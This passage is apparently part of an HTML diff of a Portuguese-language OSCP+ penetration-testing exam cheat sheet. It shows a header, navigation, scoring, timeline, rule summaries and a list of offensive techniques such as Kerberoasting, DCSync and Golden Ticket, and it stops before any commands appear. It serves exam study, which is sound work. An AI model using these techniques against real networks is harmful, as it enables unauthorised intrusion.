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" alt="OSCP Logo" style="width:88px;height:88px;object-fit:contain;filter:drop-shadow(0 0 20px #ff6a0099) drop-shadow(0 0 45px #ff6a0055)">
+    <div class="hero-titles">
+      <div class="hero-brand">OffSec Certified Professional</div>
+      <div class="hero-h1">OSCP<span>+</span></div>
+      <div class="hero-sub">CHEAT SHEET · PEN-200 · 2026</div>
+    </div>
+  </div>
+  <div class="hero-meta">
+    <div class="hero-pill">⏱ 23H 45MIN</div>
+    <div class="hero-pill grn">🎯 PASSING: 70/100 PTS</div>
+    <div class="hero-pill pur">🏰 AD SET: 40 PTS</div>
+    <div class="hero-pill">🖥 3× STANDALONE: 20 PTS</div>
+    <div class="hero-pill yel">📝 REPORT: +24H</div>
+    <div class="hero-pill red">🚫 NO AI · NO BOT</div>
+    <div class="hero-pill">⚡ METASPLOIT: 1 ALVO</div>
+    <div class="hero-pill grn">🔓 OPEN BOOK</div>
+  </div>
+</header>
+
+<!-- ══════════ NAV ══════════ -->
+<nav class="navbar">
+  <a onclick="goTo('overview')" style="cursor:pointer">OVERVIEW</a>
+  <a onclick="goTo('enum')" style="cursor:pointer">ENUMERATION</a>
+  <a onclick="goTo('web')" style="cursor:pointer">WEB ATTACKS</a>
+  <a onclick="goTo('exploitation')" style="cursor:pointer">EXPLOITATION</a>
+  <a onclick="goTo('bof')" style="cursor:pointer">BUFFER OVERFLOW</a>
+  <a onclick="goTo('ad')" style="cursor:pointer">ACTIVE DIRECTORY</a>
+  <a onclick="goTo('privesc-linux')" style="cursor:pointer">PRIVESC LINUX</a>
+  <a onclick="goTo('privesc-win')" style="cursor:pointer">PRIVESC WINDOWS</a>
+  <a onclick="goTo('pivoting')" style="cursor:pointer">PIVOTING</a>
+  <a onclick="goTo('shells')" style="cursor:pointer">SHELLS & PAYLOADS</a>
+  <a onclick="goTo('passwords')" style="cursor:pointer">PASSWORDS</a>
+  <a onclick="goTo('xfer')" style="cursor:pointer">FILE TRANSFER</a>
+  <a onclick="goTo('report')" style="cursor:pointer">EXAM REPORT</a>
+</nav>
+
+<!-- ══════════ SCORE BANNER ══════════ -->
+<div class="score-banner">
+  <div class="score-cell"><div class="sc-label">Duração</div><div class="sc-val c">23h 45m</div></div>
+  <div class="score-cell"><div class="sc-label">Para Passar</div><div class="sc-val g">70 / 100</div></div>
+  <div class="score-cell"><div class="sc-label">AD Set</div><div class="sc-val p">40 pts</div></div>
+  <div class="score-cell"><div class="sc-label">Standalone ×3</div><div class="sc-val c">20 pts each</div></div>
+  <div class="score-cell"><div class="sc-label">Bonus Points</div><div class="sc-val r">REMOVIDO</div></div>
+  <div class="score-cell"><div class="sc-label">Metasploit</div><div class="sc-val y">1 máquina</div></div>
+  <div class="score-cell"><div class="sc-label">Validade OSCP+</div><div class="sc-val p">3 anos</div></div>
+  <div class="score-cell"><div class="sc-label">Custo PEN-200</div><div class="sc-val g">~US$ 1.599</div></div>
+</div>
+
+<!-- ══════════ MAIN ══════════ -->
+<main class="page">
+
+<!-- ══════ 0. OVERVIEW ══════ -->
+<section class="sec" id="overview">
+  <div class="sec-head">
+    <span class="sec-num">00</span>
+    <span class="sec-title">Overview do Exame OSCP+ 2026</span>
+    <span class="sec-badge">PEN-200</span>
+  </div>
+
+  <div class="g2">
+    <div>
+      <!-- Score breakdown -->
+      <div class="card ccyan" style="margin-bottom:14px">
+        <div class="ch"><span class="ico">🎯</span><span class="title">Distribuição de Pontos</span></div>
+        <div class="cb0">
+          <div class="score-breakdown" style="padding:14px;margin:0">
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-p)">AD Máquina #1</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:10%;background:linear-gradient(90deg,#7c00cc,#bf00ff)">AD1</div></div>
+              <div class="sbd-pts" style="color:var(--neon-p)">10 pts</div>
+            </div>
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-p)">AD Máquina #2</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:10%;background:linear-gradient(90deg,#7c00cc,#bf00ff)">AD2</div></div>
+              <div class="sbd-pts" style="color:var(--neon-p)">10 pts</div>
+            </div>
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-p)">AD Domain Controller</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:20%;background:linear-gradient(90deg,#7c00cc,#bf00ff)">DC</div></div>
+              <div class="sbd-pts" style="color:var(--neon-p)">20 pts</div>
+            </div>
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-c)">Standalone #1 (user+root)</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:20%;background:linear-gradient(90deg,#006688,#00f5ff)">S1</div></div>
+              <div class="sbd-pts" style="color:var(--neon-c)">20 pts</div>
+            </div>
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-c)">Standalone #2 (user+root)</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:20%;background:linear-gradient(90deg,#006688,#00f5ff)">S2</div></div>
+              <div class="sbd-pts" style="color:var(--neon-c)">20 pts</div>
+            </div>
+            <div class="sbd-row">
+              <div class="sbd-label" style="color:var(--neon-c)">Standalone #3 (user+root)</div>
+              <div class="sbd-bar-wrap"><div class="sbd-bar" style="width:20%;background:linear-gradient(90deg,#006688,#00f5ff)">S3</div></div>
+              <div class="sbd-pts" style="color:var(--neon-c)">20 pts</div>
+            </div>
+          </div>
+          <div class="alert alert-g" style="margin-top:10px">
+            <div class="alert-label">STRATEGY MÍNIMA</div>
+            AD completo (40) + 2 standalones completos (40) = <strong style="color:var(--neon-g)">80 pts</strong> ✓ aprovado com margem
+          </div>
+        </div>
+      </div>
+
+      <div class="card cyellow">
+        <div class="ch"><span class="ico">⚠️</span><span class="title">Restrições Críticas</span></div>
+        <div class="cb0">
+          <table>
+            <tr><th>Item</th><th>Status</th><th>Detalhe</th></tr>
+            <tr><td>ChatGPT / Copilot / qualquer AI</td><td><span class="tr tag">✖ BANIDO</span></td><td>Fail automático</td></tr>
+            <tr><td>Metasploit Framework</td><td><span class="ty tag">⚠ LIMITADO</span></td><td>Apenas 1 alvo; sem pivot</td></tr>
+            <tr><td>Meterpreter payload</td><td><span class="ty tag">⚠ LIMITADO</span></td><td>Mesmo alvo do MSF</td></tr>
+            <tr><td>Fóruns / Discord / hints</td><td><span class="tr tag">✖ BANIDO</span></td><td>Violação acadêmica</td></tr>
+            <tr><td>Notas pessoais offline</td><td><span class="tg tag">✔ OK</span></td><td>Sem restrição</td></tr>
+            <tr><td>Recursos online (sem AI)</td><td><span class="tg tag">✔ OK</span></td><td>Open book</td></tr>
+            <tr><td>OffSec Learning Platform</td><td><span class="tg tag">✔ OK</span></td><td>PEN-200 materials</td></tr>
+            <tr><td>SQLMap, Burp Suite, Nikto</td><td><span class="tg tag">✔ OK</span></td><td>Web apps</td></tr>
+            <tr><td>BloodHound, Mimikatz</td><td><span class="tg tag">✔ OK</span></td><td>AD/post-exploit</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card cpurple">
+        <div class="ch"><span class="ico">🕐</span><span class="title">Timeline do Exame</span></div>
+        <div class="cb0">
+          <table>
+            <tr><th>Fase</th><th>Tempo</th><th>Ação</th></tr>
+            <tr><td style="color:var(--neon-g)">Início</td><td>00:00</td><td>Verificar proctoring, VPN, ler scope COMPLETO</td></tr>
+            <tr><td style="color:var(--neon-c)">Enum total</td><td>00–02h</td><td>Nmap em TUDO; não explorar ainda; anotar</td></tr>
+            <tr><td style="color:var(--neon-c)">AD Set</td><td>02–10h</td><td>Comprometer AD mach 1, 2 e DC; proofs</td></tr>
+            <tr><td style="color:var(--neon-y)">Standalones</td><td>06–20h</td><td>2-3 máquinas; user + root; screenshots</td></tr>
+            <tr><td style="color:var(--neon-r)">Buffer final</td><td>20–23h</td><td>Revisão; proofs; iniciar notas do report</td></tr>
+            <tr><td style="color:var(--neon-r)">Exam end</td><td>23:45</td><td>Desconectar VPN; iniciar escrita do report</td></tr>
+            <tr><td style="color:var(--neon-r)">Report deadline</td><td>+24h</td><td>PDF→.7z → upload.offsec.com; verificar MD5</td></tr>
+          </table>
+          <div class="alert alert-r" style="margin-top:10px">
+            <div class="alert-label">CRÍTICO</div>
+            Report atrasado = fail automático. Enviar mesmo com score abaixo de 70 para receber feedback.
+          </div>
+        </div>
+      </div>
+
+      <div class="card cgreen">
+        <div class="ch"><span class="ico">📋</span><span class="title">AD Set — Regras Especiais (Nov/2024+)</span></div>
+        <div class="cb0">
+          <ul class="dotlist">
+            <li><strong>Assumed Compromise:</strong> você recebe <code>user:password</code> de domínio desde o início</li>
+            <li><strong>Pontos parciais AD:</strong> ganhe pts por mach 1 e 2 mesmo sem comprometer o DC</li>
+            <li><strong>Metasploit NÃO pode pivotar:</strong> usaria mais de 1 alvo — use Chisel/Ligolo-ng/SSH</li>
+            <li><strong>Fluxo:</strong> creds → enum domínio → lateral → priv escalation → DA → DC proof.txt</li>
+            <li><strong>BloodHound é chave:</strong> rode antes de qualquer exploit para mapear o caminho</li>
+            <li><strong>Screenshot obrigatório</strong> por máquina AD: <code>whoami</code> + <code>ipconfig</code> + proof.txt</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PEN-200 Topics -->
+  <div class="card ccyan">
+    <div class="ch"><span class="ico">📚</span><span class="title">Conteúdo PEN-200 — Tudo que cai no exame</span></div>
+    <div class="cb0">
+      <div class="g4">
+        <div>
+          <div style="color:var(--neon-c);font-family:var(--mono);font-size:10px;letter-spacing:1px;margin-bottom:6px">RECON & ENUM</div>
+          <ul class="dotlist">
+            <li>Port scanning (Nmap)</li><li>Service/version enum</li><li>SMB/NFS/SNMP enum</li>
+            <li>DNS enumeration</li><li>Web directory busting</li><li>LDAP / RPC enum</li>
+          </ul>
+        </div>
+        <div>
+          <div style="color:var(--neon-g);font-family:var(--mono);font-size:10px;letter-spacing:1px;margin-bottom:6px">WEB & EXPLOIT</div>
+          <ul class="dotlist">
+            <li>SQL Injection</li><li>XSS / CSRF</li><li>LFI / RFI / RCE</li>
+            <li>File Upload bypass</li><li>Buffer Overflow (x86)</li><li>Exploit modification</li>
+          </ul>
+        </div>
+        <div>
+          <div style="color:var(--neon-p);font-family:var(--mono);font-size:10px;letter-spacing:1px;margin-bottom:6px">ACTIVE DIRECTORY</div>
+          <ul class="dotlist">
+            <li>BloodHound / SharpHound</li><li>Kerberoasting</li><li>AS-REP Roasting</li>
+            <li>Pass-the-Hash/Ticket</li><li>Mimikatz / DCSync</li><li>Golden/Silver Ticket</li>
+          </ul>
+        </div>
+        <div>
+          <div style="color:var(--neon-y);font-family:var(--mono);font-size:10px;letter-spacing:1px;margin-bottom:6px">POST-EXPLOIT</div>
+          <ul class="dotlist">
+            <li>Linux PrivEsc</li><li>Windows PrivEsc</li><li>Port Forwarding</li>
+            <li>Pivoting / Tunneling</li><li>Password cracking</li><li>Report writing</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 1. ENUMERATION ══════ -->
+<section class="sec" id="enum">
+  <div class="sec-head">
+    <span class="sec-num">01</span>
+    <span class="sec-title">Enumeration & Reconnaissance</span>
+    <span class="sec-badge">RECON</span>
+  </div>
+
+  <div class="card ccyan">
